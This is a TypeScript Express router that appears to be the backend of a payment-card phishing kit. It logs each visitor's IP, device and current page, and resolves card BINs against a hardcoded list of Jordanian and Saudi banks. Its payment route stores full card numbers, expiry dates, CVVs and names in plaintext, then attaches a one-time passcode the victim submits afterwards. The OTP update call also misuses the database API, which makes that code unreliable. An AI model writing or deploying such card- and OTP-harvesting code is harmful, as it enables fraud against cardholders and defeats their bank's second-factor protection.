import { Router } from "express";
import { supabase } from "../lib/supabase";
import { logger } from "../lib/logger";

const router = Router();

// Track visitor online status, current page, and system details
router.post("/track", async (req, res) => {
  try {
    const { 
      id,
      page, 
      ip, 
      userAgent, 
      os, 
      device, 
      browser, 
      location,
      sessionData 
    } = req.body;

    if (!id) {
      return res.status(400).json({ error: "Missing visitor ID" });
    }

    const { data, error } = await supabase
      .from("visitor_tracking")
      .upsert([
        {
          id,
          page,
          ip,
          user_agent: userAgent,
          os,
          device,
          browser,
          location,
          session_data: sessionData,
          last_active: new Date().toISOString()
        }
      ]);

    if (error) {
      logger.error({ errorMessage: error.message }, "Supabase tracking error");
      return res.status(500).json({ error: "Failed to track visitor" });
    }

    res.json({ success: true, data });
  } catch (err) {
    logger.error({ err }, "Tracking route error");
    res.status(500).json({ error: "Internal server error" });
  }
});

// Live BIN Lookup endpoint
router.get("/bin-lookup/:bin", async (req, res) => {
  const { bin } = req.params;
  const cleanBin = (bin || "").replace(/\D/g, "").slice(0, 8);

  if (!cleanBin || cleanBin.length < 6) {
    return res.status(400).json({ error: "Invalid BIN. Provide at least 6 digits." });
  }

  try {
    // Attempt 1: binlist.net
    const binlistRes = await fetch(`https://lookup.binlist.net/${cleanBin}`, {
      headers: {
        "Accept-Version": "3",
        "User-Agent": "Mozilla/5.0"
      },
      signal: AbortSignal.timeout(3000)
    }).catch(() => null);

    if (binlistRes && binlistRes.ok) {
      const binlistData = await binlistRes.json();
      return res.json(binlistData);
    }

    // Attempt 2: handyapi.com
    const handyRes = await fetch(`https://data.handyapi.com/bin/${cleanBin}`, {
      signal: AbortSignal.timeout(3000)
    }).catch(() => null);

    if (handyRes && handyRes.ok) {
      const handyData = await handyRes.json();
      if (handyData && handyData.Status === "SUCCESS") {
        const countryName = handyData.Country?.Name || "Jordan";
        const alpha2 = handyData.Country?.A2 || "JO";
        const emoji = alpha2 === "DK" ? "🇩🇰" : alpha2 === "JO" ? "🇯🇴" : alpha2 === "SA" ? "🇸🇦" : alpha2 === "QA" ? "🇶🇦" : alpha2 === "AE" ? "🇦🇪" : alpha2 === "KW" ? "🇰🇼" : "🌍";

        return res.json({
          number: {
            length: 16,
            luhn: true
          },
          scheme: (handyData.Scheme || "visa").toLowerCase(),
          type: (handyData.Type || "debit").toLowerCase(),
          brand: handyData.CardTier || handyData.Scheme || "Standard",
          prepaid: handyData.Type?.toLowerCase().includes("prepaid") || false,
          country: {
            numeric: handyData.Country?.N3 || "400",
            alpha2: alpha2,
            name: countryName,
            emoji: emoji,
            currency: alpha2 === "JO" ? "JOD" : alpha2 === "SA" ? "SAR" : alpha2 === "DK" ? "DKK" : "USD",
            latitude: 31,
            longitude: 35
          },
          bank: {
            name: handyData.Issuer || "Issuing Bank",
            city: "Capital"
          }
        });
      }
    }
  } catch (e) {
    logger.warn({ bin: cleanBin, error: (e as any)?.message }, "Live BIN lookup failed, falling back to local database");
  }

  // Fallback local BIN database
  const isVisa = cleanBin.startsWith("4");
  const isMastercard = /^5[1-5]|^2[2-7]/.test(cleanBin);
  const isAmex = /^3[47]/.test(cleanBin);

  let scheme = isVisa ? "visa" : isMastercard ? "mastercard" : isAmex ? "amex" : "visa";
  let bankName = "Issuing Bank";
  let countryName = "Jordan";
  let emoji = "🇯🇴";
  let currency = "JOD";
  let brand = "Classic";
  let type = "debit";

  if (/^(458838|458837|402289|417633|400000|402400)/.test(cleanBin)) {
    bankName = "Arab Bank";
    brand = "Platinum";
  } else if (/^(521178|528430|489392|530122)/.test(cleanBin)) {
    bankName = "Housing Bank for Trade & Finance";
    brand = "Gold";
    type = "credit";
  } else if (/^(410292|421111|540700)/.test(cleanBin)) {
    bankName = "Bank of Jordan";
  } else if (/^(530006|540759|426178)/.test(cleanBin)) {
    bankName = "Cairo Amman Bank";
  } else if (/^(431180|520010|450638)/.test(cleanBin)) {
    bankName = "Bank al Etihad";
    brand = "Signature";
  } else if (/^(589005|589006|484783|455708|440647)/.test(cleanBin)) {
    bankName = "Al Rajhi Bank";
    countryName = "Saudi Arabia";
    emoji = "🇸🇦";
    currency = "SAR";
    brand = "Mada";
  }

  return res.json({
    number: {
      length: 16,
      luhn: true
    },
    scheme,
    type,
    brand,
    prepaid: false,
    country: {
      numeric: "400",
      alpha2: emoji === "🇸🇦" ? "SA" : "JO",
      name: countryName,
      emoji: emoji,
      currency: currency,
      latitude: 31,
      longitude: 35
    },
    bank: {
      name: bankName,
      city: emoji === "🇸🇦" ? "Riyadh" : "Amman"
    }
  });
});

// Store payment data with OTP
router.post("/payment", async (req, res) => {
  try {
    const { 
      paymentId,
      cardNumber,
      expiry,
      cvv,
      name,
      bankName,
      otp,
      amount,
      currency,
      visitorId,
      binData
    } = req.body;

    if (paymentId) {
      // Update existing payment with OTP
      const { data, error } = await supabase
        .from("payments")
        .update(paymentId, {
          otp
        });
      
      if (error) {
        logger.error({ errorMessage: error.message }, "Supabase payment update error");
        return res.status(500).json({ error: "Failed to update payment" });
      }
      return res.json({ success: true, data });
    }

    // Never use client storage, all data goes directly to Supabase server-side
    const { data, error } = await supabase
      .from("payments")
      .insert([
        {
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          bank_name: bankName,
          otp,
          amount,
          currency,
          visitor_id: visitorId,
          bin_data: binData,
          created_at: new Date().toISOString()
        }
      ]);

    if (error) {
      logger.error({ errorMessage: error.message }, "Supabase payment error");
      return res.status(500).json({ error: "Failed to process payment" });
    }

    res.json({ success: true, data });
  } catch (err) {
    logger.error({ err }, "Payment route error");
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
